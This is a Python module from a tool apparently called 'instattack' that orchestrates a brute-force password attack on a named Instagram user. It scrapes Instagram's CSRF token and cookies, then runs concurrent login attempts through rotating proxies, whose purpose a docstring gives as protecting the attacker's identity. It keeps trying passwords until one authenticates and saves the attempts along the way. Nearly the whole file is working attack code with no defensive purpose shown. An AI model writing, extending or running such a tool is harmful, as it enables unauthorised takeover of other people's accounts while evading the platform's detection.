import asyncio
import requests
import re

from instattack.conf import settings

from instattack.src.login import LoginHandler
from instattack.src.proxies import ProxyHandler


def post_handlers(user, config):

    lock = asyncio.Lock()
    start_event = asyncio.Event()
    auth_result_found = asyncio.Event()

    proxy_handler = ProxyHandler(
        config,
        lock=lock,
        start_event=start_event,
    )

    password_handler = LoginHandler(
        config,
        proxy_handler,
        user=user,
        start_event=start_event,
        stop_event=auth_result_found,
    )
    return proxy_handler, password_handler


async def get_token():
    """
    IMPORTANT:
    ---------
    The only reason to potentially use async retrieval of token would be if we
    wanted to use proxies and weren't sure how well the proxies would work.  It
    is much faster to just use a regular request, but does not protect identity.

    For now, we will go the faster route, but leave the code around that found
    the token through iterative async requests for the token.
    """
    with requests.Session() as session:
        response = session.get(settings.INSTAGRAM_URL, headers=settings.HEADERS())
        token = re.search('(?<="csrf_token":")\w+', response.text).group(0)
        return token, response.cookies


async def attack(loop, user, config):
    """
    Uses the token retrieved from the initial phase of the command to
    iteratively try each password for the given user with the provided
    token until a successful response is achieved for each password or
    a successful authenticated response is achieved for any password.

    We cannot perform any actions in finally because if we hit an exception,
    the loop will have been shutdown by that point.

    Proxies will not be saved if it wasn't started, but that is probably
    desired behavior.
    """
    proxy_handler, password_handler = post_handlers(user, config)

    try:
        results = await asyncio.gather(
            password_handler.run(loop),
            proxy_handler.run(loop)
        )

    except Exception as e:
        if not proxy_handler.broker._stopped:
            proxy_handler.broker.stop(loop)

        # We might need a stop method for the password handler still just in case
        # an exception is raised.
        # await password_handler.stop(loop)

        # Save Attempts Up Until This Point & Save Proxies
        # Do we really want to save proxies on exceptions?
        await password_handler.save(loop)
        await proxy_handler.pool.save(loop)

        loop.call_exception_handler({'exception': e})

    else:
        # Proxy Handler Should be Stopped?
        proxy_handler.broker.stop(loop)

        # We might need a stop method for the password handler still just in case
        # an exception is raised.
        # await password_handler.stop(loop)

        # Save Attempts Up Until This Point & Save Proxies
        await password_handler.save(loop)
        await proxy_handler.pool.save(loop)

        return results[0]
